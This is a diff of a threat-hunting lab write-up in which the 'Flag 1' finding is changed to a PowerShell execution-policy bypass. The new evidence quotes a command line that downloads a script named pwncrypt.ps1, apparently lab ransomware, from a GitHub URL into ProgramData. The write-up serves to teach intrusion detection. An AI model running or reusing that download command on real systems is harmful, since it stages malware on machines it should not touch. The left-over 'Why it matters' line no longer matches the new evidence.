@@ -72,14 +72,15 @@ hits
 
 ---
 
-🚩 **Flag 1 – Initial PowerShell Execution Detection**  
-🎯 **Objective:** Pinpoint the earliest suspicious PowerShell activity that marks the intruder's possible entry.  
-📌 **Finding (answer):** **2025-07-19T02:07:43.9041721Z**  
+🚩 **Flag 1 – Initial Execution Detection**  
+🎯 **Objective:** Detect the earliest anomalous execution that could represent an entry point.  
+📌 **Finding (answer):** **-ExecutionPolicy**  
 🔍 **Evidence:**  
-- **Host:** nathan-iel-vm  
-- **Timestamp:** 2025-07-18 ~02:07:42Z (console), earliest creation at **2025-07-19T02:07:43.9041721Z**  
-- **Process:** powershell.exe → `whoami.exe /all`  
-- **CommandLine:** `"powershell.exe" whoami /all`  
+- **Host:** gab-intrn-vm  
+- **Timestamp:** 10/6/2025, 12:13:22.448 PM (console), earliest creation at **2025-10-06T12:13:22.4483418Z**  
+- **Process:** powershell.exe  
+- **CommandLine:** `
+"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`  
 - **SHA256:** `9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3`  
 💡 **Why it matters:** Establishes the first malicious PowerShell usage to enumerate identity/privileges, anchoring the intrusion timeline.
 **KQL Query Used:**
